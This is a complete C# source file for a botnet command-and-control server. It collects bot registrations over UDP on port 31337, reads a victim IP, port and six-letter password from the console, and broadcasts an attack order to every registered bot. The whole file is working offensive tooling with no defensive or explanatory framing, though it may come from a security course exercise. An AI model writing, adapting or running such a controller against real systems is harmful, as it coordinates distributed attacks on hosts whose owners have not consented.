using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;

namespace CCServer
{

    class Server
    {

        // Incoming data from the client.  
        public HashSet<IPEndPoint> botList = new HashSet<IPEndPoint>();
        private  String name = "nnnnnnnnnnn";
        private byte[] serverNameBytes = new byte[32];
        private Thread listeningThread;
        private Mutex listMutex = new Mutex();


        public Server()
        {
            createServerNameBytes();
            listeningThread = new Thread(listenToClients);
            listeningThread.Start();
            Console.WriteLine("Command and control server " + name.TrimEnd(' ') + " active");
            waitForAttackCommand();
        }

        private void createServerNameBytes()
        {
            for (int i = name.Length; i < 32; i++)
            {
                name = name + " ";
            }
            serverNameBytes = Encoding.ASCII.GetBytes(name);
        }



        public void listenToClients()
        {
            byte[] data = new byte[2];
            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 31337);
            UdpClient newsock = new UdpClient(ipep);

            Console.WriteLine("Waiting for a bot...");

            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);

            while (true)
            {
                try
                {
                    data = newsock.Receive(ref sender);
                    int botListeningPort = BitConverter.ToInt16(data, 0);
                    if (botListeningPort > 1023 && botListeningPort < 65536)
                    {
                        //Console.WriteLine("Message received from {0}: listening port - {1}", sender.ToString(), botListeningPort);
                        IPEndPoint botListeningIPEndPoint = new IPEndPoint(sender.Address, botListeningPort);
                        listMutex.WaitOne();
                        if (botList.Add(botListeningIPEndPoint))
                            Console.WriteLine("Message received from {0}: listening port - {1}", sender.ToString(), botListeningPort);
                        listMutex.ReleaseMutex();
                    }
                }catch (Exception exception){
                    Console.WriteLine(exception.Message);
                }
            }
        }


        public void waitForAttackCommand()
        {
            while (true)
            {
                   
                Console.WriteLine("Server is waiting to get: IP - X.X.X.X, Port - ####, Password - 6 chars [a-z]");
                String victimDetailsFromUser = Console.ReadLine();
                String[] sep = { ", " };
                String[] inputArr = victimDetailsFromUser.Split(sep, StringSplitOptions.RemoveEmptyEntries);
                IPAddress victimIPAddress;
                if (inputArr.Length == 3 && IPAddress.TryParse(inputArr[0], out victimIPAddress))
                {
                    int victimPort = 0;
                    if (Int32.TryParse(inputArr[1], out victimPort) && victimPort > 1023 && victimPort < 65536)
                    {
                        if (inputArr[2].Length == 6 && isLower(inputArr[2]))
                        {

                            Thread attackThread = new Thread(() => startAttack(inputArr[0], victimPort, inputArr[2]));
                            attackThread.Start();
                        }

                    }
                }
                
                
            }

            
        }


        public void startAttack(string victimIP, int victimPort, String password)
        {
            listMutex.WaitOne();
            IPEndPoint[] attackingBots = new IPEndPoint[botList.Count];
            botList.CopyTo(attackingBots);
            listMutex.ReleaseMutex();

            Console.WriteLine("attacking victim on IP " + victimIP + ", port " + victimPort + " with " + attackingBots.Length + " bots");

            IPAddress victimIPAddress = IPAddress.Parse(victimIP);

            byte[] victimIPByteArr = victimIPAddress.GetAddressBytes();
            byte[] victimPortByteArr = BitConverter.GetBytes(victimPort);
            byte[] victimPassByteArr = Encoding.ASCII.GetBytes(password);

            byte[] messageByteArr = new byte[44];
            victimIPByteArr.CopyTo(messageByteArr, 0);
            victimPortByteArr.CopyTo(messageByteArr, 4);
            victimPassByteArr.CopyTo(messageByteArr, 6);
            serverNameBytes.CopyTo(messageByteArr, 12);

            UdpClient client = new UdpClient();

            foreach (IPEndPoint bot in attackingBots)
            {
                client.Send(messageByteArr, messageByteArr.Length, bot);
            }


            // Reset bot list
            botList = new HashSet<IPEndPoint>();


        }


        private bool isLower(String value)
        {
            foreach (char c in value)
                if (!char.IsLower(c))
                    return false;

            return true;
        }


        static void Main(String[] args)
        {
            Server server = new Server();
        }

    }


}
